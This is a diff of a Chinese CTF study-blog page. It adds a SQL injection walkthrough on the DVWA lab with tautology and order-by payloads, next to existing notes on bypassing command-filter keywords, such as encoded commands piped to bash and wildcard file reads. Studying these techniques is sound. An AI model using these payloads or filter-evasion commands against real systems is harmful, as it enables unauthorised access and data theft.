@@ -28,12 +28,12 @@
 <meta property="og:description" content="弱类型弱类型分为两种·一种是弱等于号 &#x3D;&#x3D;·一种是强等于号 &#x3D;&#x3D;&#x3D;弱等于号 &#x3D;&#x3D; 在进行比较的时候会进行类型转换，再进行比较强等于号 &#x3D;&#x3D;&#x3D; 在进行比较的时候，会先将字符串类型转换为相同类型，再进行比较如果是比较数字和字符串，或涉及到数字内容的字符串， 字符串会被转换成数值，并按照比较数值来进行比较">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-04-09T12:09:05.000Z">
-<meta property="article:modified_time" content="2025-05-08T14:05:53.013Z">
+<meta property="article:modified_time" content="2025-05-13T07:45:59.734Z">
 <meta property="article:author" content="M21in">
 <meta property="article:tag" content="web">
-<meta property="article:tag" content="php">
 <meta property="article:tag" content="reverse">
 <meta property="article:tag" content="pwn">
+<meta property="article:tag" content="php">
 <meta property="article:tag" content="python">
 <meta name="twitter:card" content="summary">
 
@@ -126,17 +126,17 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">13</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">15</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">4</span></a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">6</span></a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">11</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">12</span></a>
 
   </li>
   </ul>
@@ -197,7 +197,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-05-08 22:05:53" itemprop="dateModified" datetime="2025-05-08T22:05:53+08:00">2025-05-08</time>
+                <time title="修改时间：2025-05-13 15:45:59" itemprop="dateModified" datetime="2025-05-13T15:45:59+08:00">2025-05-13</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -267,7 +267,17 @@
 <p>都可以试试</p>
 <h4 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ca\t fla\g.php 反斜杠绕过</span><br><span class="line">cat f&#x27;&#x27;lag.php 单引号绕过</span><br><span class="line">echo &quot;命令&quot; | base64 -d | bash 管道绕过/base64编码绕过</span><br><span class="line">echo &quot;命令&quot; | xxd -r -p | bash 管道绕过/xxd编码绕过,若为hex，xxd写成hexd</span><br><span class="line">cat flag* *匹配任意,或者?匹配任意一个字母</span><br><span class="line">cat fla[a-z]g.php 用[]匹配，可以匹配一个区间的字母，只显示一个字母的结果</span><br><span class="line">cat fla&#123;a-z&#125;g.php 内联执行</span><br><span class="line">cat fla&#123;f..h&#125;.php 这个命令会把f到h的所有字母都匹配一遍 并输出所有结果</span><br><span class="line">cat `ls` 查看当前目录下的所有文件</span><br><span class="line">?&gt; 可以结束php语句</span><br><span class="line">&lt;?= 短标签,同等于echo</span><br><span class="line">`/???/???%20*`; 可以匹配任意命令</span><br><span class="line">/bin/cat *   可以查看任意文件</span><br></pre></td></tr></table></figure>
 
-<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>首先判断是字符型还是数字型</p>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>首先判断是字符型还是数字型<br>拿dvwa靶场做测试</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=&#x27;</span><span class="number">2</span></span><br></pre></td></tr></table></figure>
+<p>此时执行的SQL结果其实是</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> user_id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;2&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>这个结果是恒为假的，1不会等于2，所以不会返回任何数据<br>如果输入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or &#x27;</span><span class="number">1234</span><span class="string">&#x27; = &#x27;</span><span class="number">1234</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>此时执行的SQL结果其实是</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> user_id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;1234&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;1234&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>查询条件是恒为真的，所以会返回所有的数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 order by 1#</span></span><br></pre></td></tr></table></figure>
+<p>查询SQL里的字段数</p>
 
     </div>
 
@@ -278,9 +288,9 @@
       <footer class="post-footer">
           <div class="post-tags">
               <a href="/tags/web/" <i class="fa fa-tag"></i> web</a>
-              <a href="/tags/php/" <i class="fa fa-tag"></i> php</a>
               <a href="/tags/reverse/" <i class="fa fa-tag"></i> reverse</a>
               <a href="/tags/pwn/" <i class="fa fa-tag"></i> pwn</a>
+              <a href="/tags/php/" <i class="fa fa-tag"></i> php</a>
               <a href="/tags/python/" <i class="fa fa-tag"></i> python</a>
           </div>
 
@@ -372,20 +382,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-count">12</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-count">15</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
